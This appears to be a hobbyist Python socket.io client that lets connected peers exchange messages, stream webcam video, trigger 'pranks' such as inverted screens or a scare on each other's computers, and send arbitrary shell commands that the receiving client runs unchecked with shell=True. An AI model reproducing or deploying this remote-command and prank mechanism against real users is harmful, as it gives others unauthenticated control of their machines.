import socketio
import cv2
import base64
import numpy as np
import threading
import time
import subprocess

from pranks import Pranks

sio = socketio.Client()

connected_clients = []
image_queue = []
lock = threading.Lock() 

def stop_running():
    global running
    running = False

@sio.event
def connect():
    print("Connected to server")
    menu()

@sio.event
def receive_image(data):
    
    img_base64 = data['image']
    with lock:
        image_queue.append(img_base64)
    print(f"Imagem adicionada à fila. Total na fila: {len(image_queue)}")

@sio.event
def client_list(data):
    print("\nConnected clients:")
    global connected_clients
    connected_clients = data
    for idx, client_id in enumerate(connected_clients):
        print(f"{idx + 1}. {client_id}")
    if connected_clients:
        print("\nDo you want to conect to an client?:")
        print("1. Yes")
        print("2. Return to menu")
        print("3. Refrash")
        response = int(input("Select an option: "))
        match response:
            case 1:
                pass
            case 2:
                menu()
            case 3:
                sio.emit('get_clients')
        client_index = int(input("\nSelect a client by number: ")) - 1
        if 0 <= client_index < len(connected_clients):
            selected_client = connected_clients[client_index]
        
        print("\nOptions: ")
        print("1. send message")
        print("2. Video call")
        print("3. Pranks")
        print("4. Execute command on terminal")
        print("0. Return to menu")
        option = int(input("Select an option: "))
        match option:
            case 1:
                send_message(selected_client)
            case 2:
                frame_share(selected_client)
            case 3:
                print("1 - invert mouse")
                print("2 - invert screen")
                print("3 - fright")
                print("4 - move mouse randomly")
                prank = input("Enter the prank: ")

                match prank:
                    case "1":
                        sio.emit('prank', {'to': selected_client, 'prank': 'invert mouse'})
                    case "2":
                        sio.emit('prank', {'to': selected_client, 'prank': 'invert screen'})
                    case "3":
                        sio.emit('prank', {'to': selected_client, 'prank': 'fright'})
                    case "4":
                        sio.emit('prank', {'to': selected_client, 'prank': 'move mouse randomly'})
                    case _:
                        print("Error: Unknow option. Return to menu...")
                        menu()
                menu()
            case 4:
                print("Select an option:")
                print("1 - install app")
                print("2 - open app")
                print("3 - enter command")
                print("0 - return to meno")
                selected_command = int(input())
                match(selected_command):
                    case 1: 
                        print("Não funfa :3")
                        menu()
                    case 2:
                         while(True):
                            print("Enter the app name: ")
                            command = "start /B " + str(input(""))
                            if(command == 'exit'):
                                menu()
                            sio.emit("command_sent", {'to': selected_client, 'command':  command})
                    case 3: 
                        while(True):
                            print("Enter the command or exit to cancel: ")
                            command = str(input(""))
                            if(command == 'exit'):
                                menu()
                            sio.emit("command_sent", {'to': selected_client, 'command':  command})
                    case 0: 
                        menu()
                    case _:
                        ... 
                        print("Error: Unknow option, return to menu...")
                        menu()    
            case 0:
                menu()
    else:
        print("No clients connected.")
        menu()

@sio.event
def private_message(data):
    print(f"\nPrivate message from {data['from']}: {data['message']}")

@sio.event
def broadcast_message(data):
    print(f"Received: {data}")

@sio.event
def prank(data):

    print(f"Prank received: {data}")
    print('\n\n{}'.format(data.get('prank')))
    Pranks(data.get('prank')).prank_control()      

@sio.event
def disconnect():
    print("Disconnected from server")


def send_message(cliente):
    message = ""
    print("Type 'exit' to return to the menu.")
    input("Press Enter to continue...")
    while True:
        message = input(f"Enter the message for {cliente}: ")
        if message == "exit":
            break
        sio.emit('private_message', {'to': cliente, 'message': message})
        
@sio.event
def command_received(data):
    command = data.get('command')
    try:
        result = subprocess.run(
            command,
            shell=True,            
            capture_output=True,   
            text=True              
        )
        response = {
            "out": result.stdout.strip(),
            "error": result.stderr.strip(),
            "return_code": result.returncode
        }
    except Exception as e:
        response = {
            "out": "",
            "error": str(e),
            "return_code": -1
        }
    print(response.values)
#    sio.emit('result_command', {'to': from_client, 'result': response})

"""@sio.event
def result_command(data):
    result = data.get('response')
    print("Command result:")
    print(f"Out: {result['out']}")
    print(f"Error: {result['error']}")
    print(f"Return code: {result['return_code']}")"""

def frame_share(cliente):
    cap = cv2.VideoCapture(0)

    print("Press Q to stop...")
    while True:
        ret, frame = cap.read()
        if not ret:
            break

        _, buffer = cv2.imencode('.jpg', frame)

        img_base64 = base64.b64encode(buffer).decode('utf-8')

        sio.emit('frame_share', {'to': cliente,'image': img_base64})

        if cv2.waitKey(1) & 0xFF == ord('q'):
            break


    cap.release()
    cv2.destroyAllWindows()

def process_images():
    while True:
        if image_queue:
            with lock:
                image_data = image_queue.pop(0)
            img_buffer = base64.b64decode(image_data)
            img_array = np.frombuffer(img_buffer, dtype=np.uint8)
            img = cv2.imdecode(img_array, cv2.IMREAD_COLOR)

            if img is not None:
                cv2.imshow('Recebendo imagens', img)
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    break
            else:
                print("Erro ao decodificar imagem")
        else:
            time.sleep(0.1)

    cv2.destroyAllWindows()

def menu():
    print("1. Send broadcast message")
    print("2. Get connected clients")
    print("3. Exit")
    try:
        option = int(input("Select an option: "))
        match option:
            case 1:
                message = input("Enter the broadcast message: ")
                sio.emit('broadcast_message', message)
            case 2:
                sio.emit('get_clients')       
            case 3:
                sio.disconnect()
            case _:
                print("Invalid option. Please try again.\n")
                menu()
            
    except ValueError:
        print("Invalid input. Please enter a valid number.")
        menu()

thread = threading.Thread(target=process_images, daemon=True)
thread.start()


sio.connect('https://zany-xylophone-6664p9vgwj63r4rr-3000.app.github.dev/')
sio.wait()



